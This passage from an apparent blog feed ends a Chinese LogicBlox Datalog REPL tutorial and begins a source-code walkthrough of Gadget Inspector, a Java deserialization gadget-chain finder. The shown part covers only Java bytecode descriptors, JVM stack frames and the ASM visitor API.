0.&#x27;</span></span><br></pre></td></tr></table></figure><p>修改冰淇淋售价后再添加约束：</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">exec <span class="string">&#x27;^price[&quot;Popsicle Lemon&quot;] = 40.&#x27;</span></span><br><span class="line">addblock <span class="string">&#x27;profit[_] = value -&gt; value &gt;= 0.&#x27;</span></span><br></pre></td></tr></table></figure><p>再次修改冰淇淋售价，返回约束错误：</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec <span class="string">&#x27;^price[&quot;Popsicle Lemon&quot;] = 10.&#x27;</span></span><br></pre></td></tr></table></figure><img src="https://i.loli.net/2021/10/26/9TnycWQ4ZeBCJob.png"><h1 id="0x02-结语"><a href="#0x02-结语" class="headerlink" title="0x02 结语"></a>0x02 结语</h1><p>有一说一，这个入门完全不足以让人看懂 <a href="https://bitbucket.org/yanniss/doop/src/master/lb-logic/">doop&#x2F;lb-logic</a> 里面的规则，做都做了就理上来了XD</p><p>补充：本地可以使用 <a href="http://snf-705535.vm.okeanos.grnet.gr/agreement.html">PA-Datalog</a> 引擎，是 LogicBlox v3 的改良版本，可用于程序分析。</p>]]></content>
    
    
    <summary type="html">30 分钟 LogicBlox REPL 教程</summary>
    
    
    
    <category term="Other" scheme="https://jckling.github.io/categories/Other/"/>
    
    
    <category term="Datalog" scheme="https://jckling.github.io/tags/Datalog/"/>
    
  </entry>
  
  <entry>
    <title>Gadget Inspector 源码解析</title>
    <link href="https://jckling.github.io/2021/10/12/Security/Gadget%20Inspector%20%E6%BA%90%E7%A0%81%E8%A7%A3%E6%9E%90/"/>
    <id>https://jckling.github.io/2021/10/12/Security/Gadget%20Inspector%20%E6%BA%90%E7%A0%81%E8%A7%A3%E6%9E%90/</id>
    <published>2021-10-12T03:41:30.000Z</published>
    <updated>2021-11-23T07:11:29.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>Netflix 工程师开发的 Gadget Inspector 是一个用于挖掘 Java 反序列化漏洞利用链的工具，网上有两个同名资料 Automated Discovery of Deserialization Gadget Chains：<a href="https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains-wp.pdf">论文</a>、<a href="https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains.pdf">PPT</a>。看懂工作流程并不难，入口类非常清晰明了，主要是逆拓扑排序、JVM 模拟（本地变量表、操作数栈）的部分比较晦涩。鉴于我四舍五入算是零基础接触 Java，所以前面先补充一些相关知识，后面再详细解析 Gadget Inspector 的代码。</p><p>加了注释的源码：<a href="https://github.com/jckling/gadgetinspector">jckling&#x2F;gadgetinspector</a></p><h1 id="0x01-预备知识"><a href="#0x01-预备知识" class="headerlink" title="0x01 预备知识"></a>0x01 预备知识</h1><h2 id="1-1-Java-字节码"><a href="#1-1-Java-字节码" class="headerlink" title="1.1 Java 字节码"></a>1.1 Java 字节码</h2><p>看美团的 <a href="https://tech.meituan.com/2019/09/05/java-bytecode-enhancement.html">字节码增强技术探索</a> 里面的介绍就够了，内容包括 java 的字节码、asm 框架、Javassist 框架以及 instrument 类库。</p><p><strong>限定名（qualified names）</strong>：名称、<code>.</code>、标识符，例如：demo.servlet.HelloServlet，有些地方用 <code>/</code> 代替点号</p><p><strong>简单名称（simple name）</strong>：单个标识符，例如：test</p><p><strong>完全限定名（fully qualified names）</strong>：每个原始类型、命名包、顶级类和顶级接口都有一个完全限定名，有的是简单名称有的是限定名，详见 <a href="https://docs.oracle.com/javase/specs/jls/se17/html/jls-6.html#jls-6.7">6.7. Fully Qualified Names and Canonical Names</a></p><p><strong>描述符（Descriptor）</strong></p><ol><li><p>字段（Field）描述符</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">FieldDescriptor:</span><br><span class="line">FieldType</span><br><span class="line"></span><br><span class="line">FieldType:</span><br><span class="line">    BaseType</span><br><span class="line">    ObjectType</span><br><span class="line">    ArrayType</span><br><span class="line">   </span><br><span class="line">BaseType:</span><br><span class="line">    B</span><br><span class="line">    C</span><br><span class="line">    D</span><br><span class="line">    F</span><br><span class="line">    I</span><br><span class="line">    J</span><br><span class="line">    S</span><br><span class="line">    Z</span><br><span class="line">   </span><br><span class="line">ObjectType:</span><br><span class="line">    L ClassName ;</span><br><span class="line"></span><br><span class="line">ArrayType:</span><br><span class="line">    [ ComponentType</span><br><span class="line"></span><br><span class="line">ComponentType:</span><br><span class="line">    FieldType</span><br></pre></td></tr></table></figure><p> 说明</p><table><thead><tr><th>BaseType Character</th><th>Type</th><th>Interpretation</th></tr></thead><tbody><tr><td>B</td><td>byte</td><td>signed byte</td></tr><tr><td>C</td><td>char</td><td>Unicode character code point in the Basic Multilingual Plane,     encoded with UTF-16</td></tr><tr><td>D</td><td>double</td><td>double-precision floating-point value</td></tr><tr><td>F</td><td>float</td><td>single-precision floating-point value</td></tr><tr><td>I</td><td>int</td><td>integer</td></tr><tr><td>J</td><td>long</td><td>long integer</td></tr><tr><td>L</td><td>ClassName</td><td>;referencean instance of class ClassName</td></tr><tr><td>S</td><td>short</td><td>signed short</td></tr><tr><td>Z</td><td>boolean</td><td>true or false</td></tr><tr><td>[</td><td>reference</td><td>one array dimension</td></tr></tbody></table></li><li><p>方法（Method）描述符</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">MethodDescriptor:</span><br><span class="line">    ( ParameterDescriptor* ) ReturnDescriptor</span><br><span class="line"></span><br><span class="line">ParameterDescriptor:</span><br><span class="line">    FieldType</span><br><span class="line"></span><br><span class="line">ReturnDescriptor:</span><br><span class="line">    FieldType</span><br><span class="line">    VoidDescriptor</span><br><span class="line"></span><br><span class="line">VoidDescriptor:</span><br><span class="line">    V</span><br></pre></td></tr></table></figure></li></ol><h2 id="1-2-JVM"><a href="#1-2-JVM" class="headerlink" title="1.2 JVM"></a>1.2 JVM</h2><p>Gadget Inspector 的 <code>TaintTrackingMethodVisitor</code> 中模拟了 JVM 的本地变量表（Local Variable Table）和操作数栈（Operand Stack），用于进行污点分析。</p><p><strong>栈帧（Stack Frame）</strong> 是用于支持虚拟机进行方法调用和方法执行的数据结构，每个方法从调用到执行完成的过程，都对应着一个栈帧在虚拟机栈里从入栈到出栈的过程。</p><p><strong>本地变量表（Local Variable Table）</strong> 存储了方法参数和方法内定义的局部变量，隐式传入实例对象本身 <code>this</code> 。</p><p><strong>操作数栈（Operand Stack）</strong> 由操作码控制元素的出&#x2F;入栈，操作数栈中的元素可以是任意 Java 数据类型。</p><ul><li>入栈：本地变量表或对象实例的字段中的元素（常量&#x2F;变量）</li><li>出栈：将栈中元素写入本地变量表或返回给方法调用者（返回栈顶）</li><li>栈中元素的长度可能为 0、1、2，这里一个单位为 32 位</li></ul><h2 id="1-3-ASM"><a href="#1-3-ASM" class="headerlink" title="1.3 ASM"></a>1.3 ASM</h2><h3 id="访问者模式"><a href="#访问者模式" class="headerlink" title="访问者模式"></a>访问者模式</h3><p>访问者模式的核心思想是为了访问比较复杂的数据结构，不去改变数据结构，而是把对数据的操作抽象出来，<strong>在“访问”的过程中以回调形式在访问者中处理操作逻辑</strong>。如果要新增一组操作，那么只需要增加一个新的访问者。</p><h3 id="代码组织架构"><a href="#代码组织架构" class="headerlink" title="代码组织架构"></a>代码组织架构</h3><img src="https://i.loli.net/2021/10/14/KQyh94RWalubxLd.png" width="90%"><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">org.objectweb.asm<span class="comment"># Core API，核心包</span></span><br><span class="line">org.objectweb.asm.commons<span class="comment"># 基于 core 和 tree 的类适配器</span></span><br><span class="line">org.objectweb.asm.signature<span class="comment"># 泛型定义的相关操作 API，核心包的扩充</span></span><br><span class="line">org.objectweb.asm.tree<span class="comment"># Tree API，实现复杂的类转换</span></span><br><span class="line">org.objectweb.asm.tree.analysis        <span class="comment"># 基于 tree 包提供的静态字节码分析框架</span></span><br><span class="line">org.objectweb.asm.util<span class="comment"># 用于调试的类访问器和适配器</span></span><br><span class="line">org.objectweb.asm.xml<span class="comment"># 弃用</span></span><br></pre></td></tr></table></figure><h3 id="工作流程"><a href="#工作流程" class="headerlink" title="工作流程"></a>工作流程</h3><ol><li><p><code>ClassReader</code> 类解析 class 文件（事件生成）</p><ul><li>调用作为参数传递给 accept 方法的 <code>ClassVisitor</code> 实例上相应的 visitXxx 方法</li></ul></li><li><p><code>ClassVisitor</code> 类将所有方法调用委派给另一个 <code>ClassVisitor</code> 实例（事件过滤）</p></li><li><p><code>ClassWriter</code> 类是 <code>ClassVisitor</code> 抽象类的子类（事件消费）</p></li></ol><p>为了对类文件进行“观察”，需要继承和重写访问者（Visitor），然后调用 ClassReader.accept 方法执行访问，该方法将按顺序调用参数 ClassVisitor 中的方法，没有重写的则调用父类 ClassVisitor 默认的方法；观察到方法时，将按顺序调用 MethodVisitor 中的方法，没有重写的也调用默认方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 构造函数</span></span><br><span class="line"><span class="comment"> * 构造一个新的 ClassReader 对象</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> classFile 要读取的 JVMS ClassFile 结构</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> ClassReader​(<span class="type">byte</span>[] classFile)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 用给定的访问者访问传递给此 ClassReader 的构造函数的 JVMS ClassFile 结构</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> classVisitor    访问者</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> parsingOptions  用于解析此类的选项（SKIP_CODE, SKIP_DEBUG, SKIP_FRAMES, EXPAND_FRAMES）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> accept​(ClassVisitor classVisitor, <span class="type">int</span> parsingOptions)</span><br></pre></td></tr></table></figure><img src="https://i.loli.net/2021/10/14/rAEhSn8x3DMLwtO.jpg"><h3 id="访问者"><a href="#访问者" class="headerlink" title="访问者"></a>访问者</h3><h4 id="1-ClassVisitor"><a href="#1-ClassVisitor" class="headerlink" title="1. ClassVisitor"></a>1. ClassVisitor</h4><p>方法调用顺序（访问顺序）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">visit [ visitSource ] [ visitModule ][ visitNestHost ][ visitOuterClass ] ( visitAnnotation | visitTypeAnnotation | visitAttribute )* ( visitNestMember | [ * visitPermittedSubclass ] | visitInnerClass | visitRecordComponent | visitField | visitMethod )* visitEnd</span><br></pre></td></tr></table></figure><p>Gadget Inspector 中涉及的方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 构造函数</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>api     访问者实现的 ASM API 版本。必须是 Opcodes.ASM4、Opcodes.ASM5、Opcodes.ASM6、Opcodes.ASM7 之一。</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> ClassVisitor​(<span class="type">int</span> api)</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 访问类的头部</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>version类版本</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>access类的访问标志（Opcodes）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>name类的内部名称（完全限定名）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>signature类的签名</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>superName父类的内部名称</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>interfaces类接口的内部名称</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">visit</span><span class="params">(<span class="type">int</span> version, <span class="type">int</span> access, java.lang.String name, java.lang.String signature, java.lang.String superName, java.lang.String[] interfaces)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 访问类的外围类，当类具有外围类时自动调用此方法</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>owner类的外围类的内部名称</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>name包含类的方法的名称，如果类没有包含在其外围类的方法中，则为空</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>descriptor包含类的方法的描述符，如果类没有包含在其外围类的方法中，则为空</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">visitOuterClass</span><span class="params">(java.lang.String owner, java.lang.String name, java.lang.String descriptor)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 访问内部类，这个内部类不一定是被访问的类的成员</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>owner内部类的内部名称</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>outerName内部类所属的类的内部名称，对于非成员类可能为空</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>innerName内部类在其外围类中的(简单)名称，对于匿名内部类可能为空</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>access内部类最初在外围类中声明的访问标志</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">visitInnerClass</span><span class="params">(java.lang.String name, java.lang.String outerName, java.lang.String innerName, <span class="type">int</span> access)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 访问类的字段</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>access字段的访问标志</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>name    字段的名称</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>descriptor字段的描述符</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>signature字段的签名</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>value       字段的初始值，仅针对静态字段</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> FieldVisitor visitField​(<span class="type">int</span> access, java.lang.String name, java.lang.String descriptor, java.lang.String signature, java.lang.Object value)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 访问类的一个方法（方法定义）</span></span><br><span class="line"><span class="comment"> * 这个方法在每次调用时必须返回一个新的 MethodVisitor 实例（或null）</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>access方法的访问标志（Opcodes）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>name方法的名称</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>descriptor方法的描述符</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>signature方法的签名，如果方法参数、返回类型和异常不使用泛型类型，则可能为空</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>exceptions方法异常类的内部名称，可能为空</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> MethodVisitor <span class="title function_">visitMethod</span><span class="params">(<span class="type">int</span> access, java.lang.String name, java.lang.String descriptor, java.lang.String signature, java.lang.String[] exceptions)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 该方法是最后一个被调用的方法，用于通知访问者该类的所有字段和方法已被访问</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">visitEnd</span><span class="params">()</span></span><br></pre></td></tr></table></figure><h4 id="2-MethodVisitor"><a href="#2-MethodVisitor" class="headerlink" title="2. MethodVisitor"></a>2. MethodVisitor</h4><p>方法调用顺序（访问顺序），<code>visit&lt;i&gt;X&lt;/i&gt;Insn</code> 按照字节码指令顺序调用。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">( visitParameter )* [ visitAnnotationDefault ] ( visitAnnotation | visitAnnotableParameterCount | visitParameterAnnotation visitTypeAnnotation | visitAttribute )* [ visitCode ( visitFrame | visit&lt;i&gt;X&lt;/i&gt;Insn | visitLabel | visitInsnAnnotation | visitTryCatchBlock | visitTryCatchAnnotation | visitLocalVariable | visitLocalVariableAnnotation | visitLineNumber )* visitMaxs ] visitEnd</span><br><span class="line"></span><br><span class="line">In addition, the visit&lt;i&gt;X&lt;/i&gt;Insn and visitLabel methods must be called in the sequential order of the bytecode instructions of the visited code.</span><br></pre></td></tr></table></figure><p>Gadget Inspector 中涉及的方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 启动对方法代码的访问，如果有的话（即非抽象方法）</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">visitCode</span><span class="params">()</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 访问局部变量和操作数堆栈元素的当前状态</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>type堆栈映射帧的类型（stack map frame）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>numLocal被访问帧中的局部变量数量</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>local被访问帧中的局部变量类型</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>numStack被访问帧中的操作数堆栈元素个数</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>stack被访问帧中的操作数堆栈元素类型</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">visitFrame</span><span class="params">(<span class="type">int</span> type, <span class="type">int</span> numLocal, java.lang.Object[] local, <span class="type">int</span> numStack, java.lang.Object[] stack)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 访问零操作数的指令</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>opcode要访问的指令的操作码</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">visitInsn</span><span class="params">(<span class="type">int</span> opcode)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 访问单个 int 类型操作数的指令</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>opcode要访问的指令的操作码：BIPUSH、SIPUSH、NEWARRAY</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>operand要访问的指令的操作数</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">visitIntInsn</span><span class="params">(<span class="type">int</span> opcode, <span class="type">int</span> operand)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 访问局部变量指令</span></span><br><span class="line"><span class="comment"> * 局部变量指令是加载或存储局部变量值的指令</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>opcode要访问的指令的操作码：ILOAD、LLOAD、FLOAD、DLOAD、ALOAD、ISTORE、LSTORE、FSTORE、DSTORE、ASTORE、RET</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>var要访问的指令的操作数（局部变量的下标）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">visitVarInsn</span><span class="params">(<span class="type">int</span> opcode, <span class="type">int</span> <span 